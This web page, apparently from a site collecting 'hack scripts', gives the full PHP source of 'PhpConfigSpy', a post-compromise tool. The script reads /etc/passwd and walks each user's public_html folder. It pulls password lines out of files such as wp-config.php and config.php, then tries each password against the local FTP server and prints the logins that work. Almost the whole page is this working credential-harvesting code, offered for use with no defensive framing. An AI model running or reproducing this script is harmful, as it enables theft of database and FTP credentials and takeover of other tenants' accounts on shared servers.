<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> PhpConfigSpy </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>PhpConfigSpy</h2>
<p class="meta">10 Feb 2014</p>

<p>This script appears to try to obtain login details for a compromised server.</p>

<h3>PhpConfigSpy Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> 
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;html&amp;gt;&quot;</span><span class="p">;</span> 
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;title&amp;gt;PhpConfigSpy v0.1&amp;lt;/title&amp;gt;&amp;lt;body&amp;gt;&quot;</span><span class="p">;</span> 

<span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 

<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">### </span>
<span class="o">@</span><span class="nv">$passwd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">);</span> 
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$passwd</span><span class="p">)</span> <span class="p">{</span> 
  <span class="k">echo</span> <span class="s2">&quot;[-] Error : coudn&#39;t read /etc/passwd&quot;</span><span class="p">;</span> 
  <span class="k">exit</span><span class="p">;</span> 
<span class="p">}</span> 
<span class="nv">$path_to_public</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="nv">$users</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="nv">$pathtoconf</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 

<span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">))</span> <span class="p">{</span> 
<span class="nv">$str</span><span class="o">=</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">);</span> 
<span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">35</span><span class="p">)</span> <span class="p">{</span> 
   <span class="nv">$pos</span><span class="o">=</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="s2">&quot;:&quot;</span><span class="p">);</span> 
   <span class="nv">$username</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$pos</span><span class="p">);</span> 
   <span class="nv">$dirz</span><span class="o">=</span><span class="s2">&quot;/home/</span><span class="si">$username</span><span class="s2">/public_html/&quot;</span><span class="p">;</span> 
   <span class="k">if</span> <span class="p">((</span><span class="nv">$username</span><span class="o">!=</span><span class="s2">&quot;&quot;</span><span class="p">))</span> <span class="p">{</span> 
       <span class="k">if</span> <span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$dirz</span><span class="p">))</span> <span class="p">{</span> 
           <span class="nb">array_push</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span><span class="nv">$username</span><span class="p">);</span> 
           <span class="nb">array_push</span><span class="p">(</span><span class="nv">$path_to_public</span><span class="p">,</span><span class="nv">$dirz</span><span class="p">);</span> 
       <span class="p">}</span> 
   <span class="p">}</span> 
<span class="p">}</span> 
<span class="nv">$i</span><span class="o">++</span><span class="p">;</span> 
<span class="p">}</span> 

<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">#### </span>


<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">#### </span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> 
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea name=&#39;main_window&#39; cols=100 rows=20&amp;gt;&quot;</span><span class="p">;</span> 

<span class="k">echo</span> <span class="s2">&quot;[+] Founded &quot;</span><span class="o">.</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$users</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; entrys in /etc/passwd</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="k">echo</span> <span class="s2">&quot;[+] Founded &quot;</span><span class="o">.</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$path_to_public</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; readable public_html directories</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 

<span class="k">echo</span> <span class="s2">&quot;[~] Searching for passwords in config.* files...</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$users</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span> 
       <span class="nv">$path</span><span class="o">=</span><span class="s2">&quot;/home/</span><span class="si">$user</span><span class="s2">/public_html/&quot;</span><span class="p">;</span> 
       <span class="nx">read_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="nv">$user</span><span class="p">);</span> 
<span class="p">}</span> 

<span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[+] Done</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 

<span class="k">function</span> <span class="nf">read_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="nv">$username</span><span class="p">)</span> <span class="p">{</span> 
   <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span> 
       <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)))</span> <span class="p">{</span> 
             <span class="nv">$fpath</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$path$file</span><span class="s2">&quot;</span><span class="p">;</span> 
             <span class="k">if</span> <span class="p">((</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span><span class="p">))</span> <span class="p">{</span> 
                <span class="k">if</span> <span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$fpath</span><span class="p">))</span> <span class="p">{</span> 
                   <span class="nv">$dr</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$fpath</span><span class="s2">/&quot;</span><span class="p">;</span> 
                   <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dr</span><span class="p">))</span> <span class="p">{</span> 
                      <span class="nx">read_dir</span><span class="p">(</span><span class="nv">$dr</span><span class="p">,</span><span class="nv">$username</span><span class="p">);</span> 
                   <span class="p">}</span> 
                   <span class="k">else</span> <span class="p">{</span> 
                        <span class="k">if</span> <span class="p">((</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;config.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;config.inc.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;db.inc.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;connect.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;wp-config.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;var.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;configure.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;db.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;db_connect.php&#39;</span><span class="p">))</span> <span class="p">{</span> 
                           <span class="nv">$pass</span><span class="o">=</span><span class="nx">get_pass</span><span class="p">(</span><span class="nv">$fpath</span><span class="p">);</span> 
                           <span class="k">if</span> <span class="p">(</span><span class="nv">$pass</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span> 
                              <span class="k">echo</span> <span class="s2">&quot;[+] </span><span class="si">$fpath\n$pass\n</span><span class="s2">&quot;</span><span class="p">;</span> 
                              <span class="nx">ftp_check</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$pass</span><span class="p">);</span> 
                           <span class="p">}</span> 
                        <span class="p">}</span> 
                   <span class="p">}</span> 
                <span class="p">}</span> 
             <span class="p">}</span> 
       <span class="p">}</span> 
   <span class="p">}</span> 
<span class="p">}</span> 

<span class="k">function</span> <span class="nf">get_pass</span><span class="p">(</span><span class="nv">$link</span><span class="p">)</span> <span class="p">{</span> 
   <span class="o">@</span><span class="nv">$config</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">);</span> 
   <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$config</span><span class="p">))</span> <span class="p">{</span> 
       <span class="nv">$line</span><span class="o">=</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span> 
       <span class="k">if</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;pass&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="nb">strstr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="nb">strstr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;passwd&#39;</span><span class="p">))</span> <span class="p">{</span> 
           <span class="k">if</span> <span class="p">(</span><span class="nb">strrpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;&quot;&#39;</span><span class="p">))</span> 
              <span class="nv">$pass</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">),(</span><span class="nb">strrpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;&quot;&#39;</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">)));</span> 
           <span class="k">else</span> 
              <span class="nv">$pass</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">),(</span><span class="nb">strrpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s2">&quot;&#39;&quot;</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">)));</span> 
           <span class="k">return</span> <span class="nv">$pass</span><span class="p">;</span> 
       <span class="p">}</span> 
   <span class="p">}</span> 
<span class="p">}</span> 

<span class="k">function</span> <span class="nf">ftp_check</span><span class="p">(</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span> 
    <span class="o">@</span><span class="nv">$ftp</span><span class="o">=</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">);</span> 
    <span class="k">if</span> <span class="p">(</span><span class="nv">$ftp</span><span class="p">)</span> <span class="p">{</span> 
       <span class="o">@</span><span class="nv">$res</span><span class="o">=</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$ftp</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">);</span> 
       <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> 
          <span class="k">echo</span> <span class="s1">&#39;[FTP] &#39;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;  Success</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
       <span class="p">}</span> 
       <span class="k">else</span> <span class="nb">ftp_quit</span><span class="p">(</span><span class="nv">$ftp</span><span class="p">);</span> 
    <span class="p">}</span> 
<span class="p">}</span> 

<span class="k">echo</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> 

<span class="k">echo</span> <span class="s2">&quot;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;</span><span class="p">;</span> 
<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
